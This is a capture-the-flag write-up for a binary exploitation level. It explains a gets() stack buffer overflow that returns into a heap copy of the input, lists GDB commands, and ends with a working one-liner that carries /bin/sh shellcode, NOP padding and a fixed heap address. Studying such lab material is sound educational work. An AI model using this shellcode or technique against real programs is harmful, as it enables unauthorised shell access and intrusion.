# LEVEL 2

## 💡 Explanation

In this level we have to:
1. Having a look to the main we can easily check that it calls directly to the function `p` and just returns, so the exploit should be in the function `p`.
2. Looking at `p` we find first a call to the function `flush`; which is used to clear the output buffer and move the buffered data to console (in case of stdout) or disk (in case of file output stream). Not very interesting...
3. Now we see that the function calls to the function `gets` which is pretty exploitable.
4. Then, it does a weird check to make sure that in case we have rewritten the eip it is not an address on the stack (since these addresses start by 0xb)...
5. Since there is a call to `strdump` on the function, we can use it to put our exploit on the heap and then we will have to prepare the stack to return the address to the shellcode, so the program will execute it. Also! We should check where does `strdump` writes on the heap; turns out it is always the same address: `0x0804a008`.
6. About how to prepare the stack to call the shellcode: the LEAVE instruction is actually MOV ESP, EBP and POP EBP; and the RET is equal to a POP EIP. So this will clear from the stack all the references to our function `p` and it should leave on the top of the stack the next instruction after the return value. What we are going to do is to put to the 4 bytes after EBP the address to the code on the heap that we want to execute; therefore when executing the instruction LEAVE it'll have on the top of the stack the given address.
7. To build the exploit what we  introduce a shellcode in the buffer and then put the its address right after EBP, as we just explained. To do so, we have to calculate when the buffer starts (0xbffff6cc) and see how many bytes we have to fill until the end of EBP (0xbffff71c - 0xbffff6cc) which is 80. Taking into account that our shellcode is 45 bytes, that makes that we have to fill an extra 35 bytes with NOPs. The output is: [SHELLCODE][35 NOPs until filling up to EBP][Adress where strdump writes]

## 👾 Commands

To find the solution:
```
[GDB] disas main
[GDB] disas p
[GDB] b *0x0804853d
[GDB] run (test with and without buffer overflow!)
[GDB] aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa11111111111111111111111111111111111!!!!
[GDB] step 1

```

To execute the solution there are two options:
- `(python -c 'print "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x90"*35 + "\x08\xa0\x04\x08"' ; cat -) | ./level2`

## 🔍 Resources

- [Use of fflush(stdin) in C](https://www.geeksforgeeks.org/use-fflushstdin-c/)
- [Buffer Overflow](https://beta.hackndo.com/buffer-overflow/)
